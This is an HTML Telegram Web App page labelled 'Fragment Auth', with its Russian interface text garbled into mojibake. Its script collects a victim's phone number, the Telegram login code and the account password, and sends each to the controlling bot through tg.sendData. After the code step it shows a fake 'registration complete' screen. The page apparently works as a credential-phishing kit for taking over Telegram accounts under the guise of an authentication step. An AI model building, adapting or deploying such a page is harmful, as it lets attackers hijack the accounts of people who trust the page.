<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; border-radius: 20px; padding: 25px; max-width: 350px; width: 100%; }
        .step { display: none; }
        .active { display: block; }
        input, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 2px solid #ddd; }
        button { background: #0088cc; color: white; border: none; cursor: pointer; }
        .loading { text-align: center; }
        .debug { background: #f0f0f0; padding: 10px; border-radius: 5px; margin: 10px 0; font-size: 12px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <!-- –®–∞–≥ 1: –¢–µ–ª–µ—Ñ–æ–Ω -->
        <div id="stepPhone" class="step active">
            <h3>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
            <input type="tel" id="phone" placeholder="79123456789" maxlength="11">
            <button onclick="sendPhone()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥</button>
            <div class="debug" id="debug1"></div>
        </div>

        <!-- –®–∞–≥ 2: –ö–æ–¥ -->
        <div id="stepCode" class="step">
            <h3>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram</h3>
            <input type="text" id="code" placeholder="12345" maxlength="5">
            <button onclick="sendCode()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
            <div class="debug" id="debug2"></div>
        </div>

        <!-- –®–∞–≥ 3: –ü–∞—Ä–æ–ª—å -->
        <div id="stepPassword" class="step">
            <h3>–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å</h3>
            <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å">
            <button onclick="sendPassword()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
            <div class="debug" id="debug3"></div>
        </div>

        <div id="stepLoading" class="step">
            <div class="loading">
                <div class="loader"></div>
                <div id="loadingText">–û—Ç–ø—Ä–∞–≤–∫–∞...</div>
            </div>
        </div>

        <div id="stepSuccess" class="step">
            <div class="loading">
                <div style="color: #2f855a; font-size: 48px; margin-bottom: 15px;">‚úÖ</div>
                <div>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞!</div>
            </div>
            <button class="btn btn-next" onclick="closeApp()">–ó–ê–ö–†–´–¢–¨</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let currentPhone = '';
        let currentCode = '';

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
        function debug(step, message) {
            console.log(`[DEBUG Step ${step}] ${message}`);
            const debugEl = document.getElementById(`debug${step}`);
            if (debugEl) {
                debugEl.style.display = 'block';
                debugEl.innerHTML = message;
            }
        }

        function showStep(stepId) {
            console.log(`–ü–µ—Ä–µ—Ö–æ–¥ –∫ —à–∞–≥—É: ${stepId}`);
            document.querySelectorAll('.step').forEach(step => {
                step.classList.remove('active');
            });
            document.getElementById(stepId).classList.add('active');
        }

        function sendPhone() {
            const phoneInput = document.getElementById('phone').value.replace(/\D/g, '');
            debug(1, `–í–≤–µ–¥–µ–Ω –Ω–æ–º–µ—Ä: ${phoneInput}`);
            
            if (!phoneInput || phoneInput.length < 10) {
                alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }
            
            currentPhone = '+7' + phoneInput;
            debug(1, `–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –Ω–æ–º–µ—Ä: ${currentPhone}`);
            
            showStep('stepLoading');
            document.getElementById('loadingText').textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞...';

            // üî• –û–¢–ü–†–ê–í–õ–Ø–ï–ú –î–ê–ù–ù–´–ï –í –ë–û–¢–ê
            const data = {
                action: 'send_phone',
                phone: currentPhone
            };
            
            console.log('–û—Ç–ø—Ä–∞–≤–ª—è—é –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç–∞:', data);
            debug(1, `–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö: ${JSON.stringify(data)}`);
            
            tg.sendData(JSON.stringify(data));
            
            // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –≤–≤–æ–¥—É –∫–æ–¥–∞
            setTimeout(() => {
                showStep('stepCode');
            }, 1500);
        }

        function sendCode() {
            const code = document.getElementById('code').value;
            debug(2, `–í–≤–µ–¥–µ–Ω –∫–æ–¥: ${code}`);
            
            if (!code || code.length < 5) {
                alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∫–æ–¥');
                return;
            }

            currentCode = code;
            debug(2, `–ö–æ–¥ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏: ${currentCode}`);
            
            showStep('stepLoading');
            document.getElementById('loadingText').textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞...';

            const data = {
                action: 'send_code',
                phone: currentPhone,
                code: currentCode
            };
            
            console.log('–û—Ç–ø—Ä–∞–≤–ª—è—é –∫–æ–¥ –≤ –±–æ—Ç–∞:', data);
            debug(2, `–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞: ${JSON.stringify(data)}`);
            
            tg.sendData(JSON.stringify(data));
            
            // –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º —É—Å–ø–µ—Ö (–≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –∂–¥–µ–º –æ—Ç–≤–µ—Ç –æ—Ç –±–æ—Ç–∞)
            setTimeout(() => {
                showStep('stepSuccess');
            }, 2000);
        }

        function sendPassword() {
            const password = document.getElementById('password').value;
            debug(3, `–í–≤–µ–¥–µ–Ω –ø–∞—Ä–æ–ª—å: ${password}`);
            
            if (!password) {
                alert('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å');
                return;
            }

            showStep('stepLoading');
            document.getElementById('loadingText').textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è...';

            const data = {
                action: 'send_password',
                phone: currentPhone,
                password: password
            };
            
            console.log('–û—Ç–ø—Ä–∞–≤–ª—è—é –ø–∞—Ä–æ–ª—å –≤ –±–æ—Ç–∞:', data);
            debug(3, `–û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞—Ä–æ–ª—è: ${JSON.stringify(data)}`);
            
            tg.sendData(JSON.stringify(data));
            
            setTimeout(() => {
                showStep('stepSuccess');
            }, 2000);
        }

        function backToPhone() {
            showStep('stepPhone');
        }

        function backToCode() {
            showStep('stepCode');
        }

        function closeApp() {
            tg.close();
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –≤–≤–æ–¥–∞
        document.getElementById('phone').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });

        document.getElementById('code').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });

        // Enter –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendPhone();
        });

        document.getElementById('code').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCode();
        });

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendPassword();
        });

        // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
        console.log('Web App –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω');
        console.log('Init Data:', tg.initData);
        console.log('Init Data Unsafe:', tg.initDataUnsafe);
        debug(1, 'Web App –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ');
    </script>
</body>
</html>